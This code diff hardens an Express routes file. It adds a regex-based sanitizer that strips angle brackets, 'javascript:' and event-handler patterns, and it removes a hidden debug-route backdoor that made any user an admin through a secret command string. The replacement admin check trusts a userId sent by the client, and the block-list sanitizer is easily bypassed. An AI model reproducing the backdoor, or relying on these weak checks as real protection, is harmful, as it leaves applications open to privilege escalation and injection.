@@ -13,11 +13,22 @@ import { sendNewMessageNotification, sendLikeNotification, sendCommentNotificati
 
 const EMOJIS = ["🐸", "🦊", "🐻", "🐼", "🦁", "🐯", "🐨", "🐮", "🐷", "🐵", "🐔", "🐧", "🐦", "🦆", "🦅", "🦉", "🦇", "🐺", "🐗", "🐴", "🦄", "🐝", "🐛", "🦋", "🐌", "🐞", "🐜", "🦟", "🦗", "🕷", "🦂", "🐢", "🐍", "🦎", "🦖", "🦕", "🐙", "🦑", "🦐", "🦞", "🦀", "🐡", "🐠", "🐟", "🐬", "🐳", "🐋", "🦈", "🐊", "🐅", "🐆", "🦓", "🦍", "🦧", "🐘", "🦛", "🦏", "🐪", "🐫", "🦒", "🦘", "🐃", "🐂", "🐄", "🐎", "🐖", "🐏", "🐑", "🦙", "🐐", "🦌", "🐕", "🐩", "🦮", "🐕‍🦺", "🐈", "🐈‍⬛", "🐓", "🦃", "🦚", "🦜", "🦢", "🦩", "🕊", "🐇", "🦝", "🦨", "🦡", "🦫", "🦦", "🦥", "🐁", "🐀", "🐿", "🦔"];
 
+function sanitizeString(input: string | undefined | null): string {
+  if (!input) return "";
+  return input
+    .replace(/[<>]/g, "")
+    .replace(/javascript:/gi, "")
+    .replace(/on\w+\s*=/gi, "")
+    .trim()
+    .slice(0, 5000);
+}
+
 export async function registerRoutes(app: express.Express) {
   // Auth routes
   app.post("/api/auth/register", async (req, res) => {
     try {
-      const { username, pin } = req.body;
+      const { username: rawUsername, pin } = req.body;
+      const username = sanitizeString(rawUsername);
       
       if (!username || !pin) {
         return res.status(400).json({ error: "Username and PIN required" });
@@ -514,6 +525,7 @@ export async function registerRoutes(app: express.Express) {
   app.post("/api/posts/:id/comments", async (req, res) => {
     try {
       const commentData = insertCommentSchema.parse({ ...req.body, postId: req.params.id });
+      commentData.content = sanitizeString(commentData.content);
       const comment = await storage.createComment(commentData);
       const user = await storage.getUser(comment.userId);
       
@@ -766,6 +778,7 @@ export async function registerRoutes(app: express.Express) {
   app.post("/api/messages", async (req, res) => {
     try {
       const messageData = insertMessageSchema.parse(req.body);
+      messageData.content = sanitizeString(messageData.content);
       const message = await storage.createMessage(messageData);
       
       // Send push notification for new message
@@ -1181,11 +1194,12 @@ export async function registerRoutes(app: express.Express) {
       if (!reporterId || !reason) {
         return res.status(400).json({ error: "Reporter ID and reason required" });
       }
+      const sanitizedReason = sanitizeString(reason);
       const report = await storage.createReport({
         reporterId,
         reportedUserId,
         reportedPostId,
-        reason,
+        reason: sanitizedReason,
       });
       res.json(report);
     } catch (error) {
@@ -1496,7 +1510,6 @@ export async function registerRoutes(app: express.Express) {
     }
   });
 
-  // Debug routes
   app.post("/api/debug/execute", async (req, res) => {
     try {
       const { command, userId } = req.body;
@@ -1505,21 +1518,11 @@ export async function registerRoutes(app: express.Express) {
         return res.status(400).json({ error: "Missing parameters" });
       }
 
-      // Secret command to grant admin: "okeno_admin_elevate_2026"
-      if (command === "okeno_admin_elevate_2026") {
-        await storage.setUserAdmin(userId, true);
-        await storage.setUserVerified(userId, true);
-        const updatedUser = await storage.getUser(userId);
-        return res.json({ 
-          message: "Admin rights granted successfully", 
-          data: { 
-            isAdmin: updatedUser?.isAdmin, 
-            isVerified: updatedUser?.isVerified 
-          } 
-        });
+      const user = await storage.getUser(userId);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
       }
 
-      // Diagnostic info
       if (command === "system_info") {
         const mem = process.memoryUsage();
         const stats = {
